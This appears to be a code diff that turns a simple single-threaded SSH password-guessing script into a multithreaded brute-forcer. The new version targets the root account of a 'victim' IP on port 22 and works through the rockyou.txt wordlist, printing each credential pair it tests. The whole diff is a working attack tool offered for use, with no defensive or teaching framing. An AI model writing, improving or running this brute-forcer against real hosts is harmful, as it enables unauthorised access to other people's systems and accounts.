@@ -1,29 +1,61 @@
 import paramiko
-import sys
+import argparse
+import socket
+import time
+from threading import Thread, BoundedSemaphore
 
-target = sys.argv[1]         # e.g., "10.0.0.1"
-username = sys.argv[2]       # e.g., "student"
-wordlist_path = sys.argv[3]  # e.g., "passwords.txt"
+max_threads = 8  # Number of concurrent threads
+connection_lock = BoundedSemaphore(value=max_threads)
 
-# Load wordlist
-with open(wordlist_path, 'r', encoding='latin-1') as file:
-    passwords = file.readlines()
 
-# Strip newline characters
-passwords = [p.strip() for p in passwords]
+def brute_force_ssh(hostname, port, user, password):
+    # Log to a file for debugging purposes
+    log = paramiko.util.log_to_file('log.log')
 
-print("Trying to brute-force...")
-for password in passwords:
+    # Create an SSH client object
+    ssh_client = paramiko.SSHClient()
+
+    # Load system host keys
+    ssh_client.load_system_host_keys()
+
+    # Automatically add unknown hosts to the list of known hosts
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
     try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(target, username=username, password=password, timeout=3)
-        print(f"Success! Username: {username} Password: {password}")
-        ssh.close()
-        break
-    except paramiko.AuthenticationException:
-        continue
-    except Exception as e:
-        print(f"Error: {e}")
-        break
+        connection_lock.acquire()
+        # Attempt SSH connection with the provided credentials
+        print('Testing credentials {}:{}'.format(user, password))
+        ssh_client.connect(hostname, port=port, username=user, password=password, timeout=5)
+        print('Credentials OK {}:{}'.format(user, password))
+    except paramiko.AuthenticationException as exception:
+        print('AuthenticationException:', exception)
+    except socket.error as error:
+        print('SocketError:', error)
+    finally:
+        # Close the SSH client connection
+        connection_lock.release()
+        ssh_client.close()
+def main():
+    parser = argparse.ArgumentParser(description="SSH Bruteforce script")
+    parser.add_argument("target_ip",    help="IP address of the victim")
+    args = parser.parse_args()
 
+    target_ip   =   args.target_ip
+    port = 22
+
+    # Read usernames from a file
+    users = 'root'
+
+    # Read passwords from a file
+    passwords = open('rockyou.txt', 'r', encoding='latin-1').readlines()
+
+    for password in passwords:
+            # Perform a brute-force attempt using the current username and password
+       #     brute_force_ssh(hostname, port, users, password.rstrip())
+        password = password.strip()
+        t = Thread(target=brute_force_ssh, args=(target_ip, port, users, password))
+        t.start()
+
+
+if __name__ == '__main__':
+    main()
